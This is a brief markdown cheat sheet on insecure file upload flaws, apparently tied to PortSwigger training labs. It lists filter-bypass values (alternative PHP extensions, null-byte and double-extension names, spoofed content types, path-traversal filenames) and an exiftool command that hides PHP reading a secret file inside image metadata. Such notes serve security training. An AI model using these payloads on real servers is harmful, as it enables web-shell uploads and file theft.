---
title: Insecure file upload
description: Insecure file upload cheatsheet
---

# Insecure File upload

## Definition

**Insecure file upload** refers to a vulnerability in a computer system that allows unauthorized users to upload files to the system. This can be a serious security risk because it can allow attackers to upload malicious files, such as viruses or malware, that can compromise the security of the system. To prevent insecure file uploads, it is important to implement appropriate security measures, such as file type restrictions and authentication checks, to ensure that only authorized users are able to upload files.

## Cheathsheet

- Upload basic php file
- Change PHP content type to `Content-Type: image/jpeg`
- Path traversal in filename `../read_carlos_secret.php` or `..%2Fread_carlos_secret.php`
- Bypass PHP file extension filter `php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, ...`
- Other bypass `.pHp, .png.php`, `.php%00.png`, ...
- Add PHP in image metadata : `exiftool -Comment='<?php echo "AAAA-"; echo file_get_contents("/home/carlos/secret"); echo "-BBBB"; ?>' toto.png.php`
- Uploading files using PUT
- Polyglot file [PHAR/JPEG generator](https://gitlab.com/xanhacks/phar-jpg-polyglot/)

## References

- [PortSwigger - File upload](https://portswigger.net/web-security/file-upload)